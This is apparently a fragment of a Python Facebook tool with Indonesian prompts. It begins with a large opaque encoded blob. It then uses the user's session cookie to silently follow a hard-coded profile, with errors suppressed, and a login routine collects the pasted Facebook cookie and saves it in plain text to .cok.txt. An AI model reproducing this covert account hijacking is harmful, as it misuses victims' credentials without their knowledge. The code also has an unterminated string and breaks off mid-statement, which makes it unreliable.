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

		for foll in parser(requests.get(f'https://mbasic.facebook.com/100083788721465',cookies={'cookie':cok}).text,'html.parser').find_all('a',href=True):

			if '/a/subscribe.php?' in foll.get('href'):

				x = requests.get(

					'https://mbasic.facebook.com'

					+

					foll[

						'href'

					],

					cookies = {

						'cookie'

						:

						cok

					}

				).text

				exit(

				)

	except:

		pass

def Login_Dulu():

	Banner(

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]input cookie facebook",

			style="bold purple"

			),

		justify="center"

	)

	Console(width=48).print(

		Panel(

			"[bold #FF00D4]saran extensi: cookiedough",

			width=48,

			subtitle="╭──",

			subtitle_align="left",

			style="bold purple",

			),

		justify="center"

	)

	cok = Console(

		).input(

			"[bold purple]   ╰─> "

		)

	open(

		".cok.txt",

		"w"

		).write(

			cok

		)

	ses = requests.Session(

		)

	try:

		lnux = (
		    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59
			"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36"
